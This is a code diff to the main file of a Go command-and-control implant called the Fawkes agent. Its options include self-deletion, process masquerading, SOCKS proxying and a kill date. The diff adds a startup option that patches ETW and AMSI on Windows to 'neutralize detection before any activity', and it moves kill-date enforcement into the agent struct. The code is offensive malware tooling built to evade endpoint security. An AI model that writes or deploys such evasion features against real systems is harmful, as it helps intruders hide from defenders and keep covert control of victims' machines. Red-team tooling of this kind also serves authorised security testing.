@@ -58,6 +58,7 @@ var (
 	selfDelete        string = ""     // Self-delete binary from disk after execution starts
 	masqueradeName    string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
 	customHeaders     string = ""     // Base64-encoded JSON of additional HTTP headers
+	autoPatch         string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
 )
 
 func main() {
@@ -119,6 +120,11 @@ func runAgent() {
 		os.Exit(0)
 	}
 
+	// Auto-patch ETW/AMSI: neutralize detection before any activity (Windows only)
+	if autoPatch == "true" {
+		autoStartupPatch()
+	}
+
 	// Self-delete: remove binary from disk after startup (process continues from memory)
 	if selfDelete == "true" {
 		selfDeleteBinary()
@@ -171,6 +177,7 @@ func runAgent() {
 		Jitter:            jitterInt,
 		User:              getUsername(),
 		Description:       fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
+		KillDate:          killDateInt64,
 		WorkingHoursStart: whStartMinutes,
 		WorkingHoursEnd:   whEndMinutes,
 		WorkingDays:       whDays,
@@ -296,12 +303,12 @@ checkinDone:
 
 	// Start main execution loop - run directly (not as goroutine) so DLL exports block properly
 	log.Printf("[INFO] Starting main execution loop for agent %s", agent.PayloadUUID[:8])
-	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt, killDateInt64)
+	mainLoop(ctx, agent, c2, socksManager, maxRetriesInt)
 	usePadding() // Reference embedded padding to prevent compiler stripping
 	log.Printf("[INFO] Fawkes agent shutdown complete")
 }
 
-func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int, killDateUnix int64) {
+func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, socksManager *socks.Manager, maxRetriesInt int) {
 	// Main execution loop
 	retryCount := 0
 	for {
@@ -311,7 +318,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 			return
 		default:
 			// Enforce kill date every cycle — exit silently if past expiry
-			if killDateUnix > 0 && time.Now().Unix() > killDateUnix {
+			if agent.KillDate > 0 && time.Now().Unix() > agent.KillDate {
 				log.Printf("[INFO] Kill date reached, exiting")
 				return
 			}
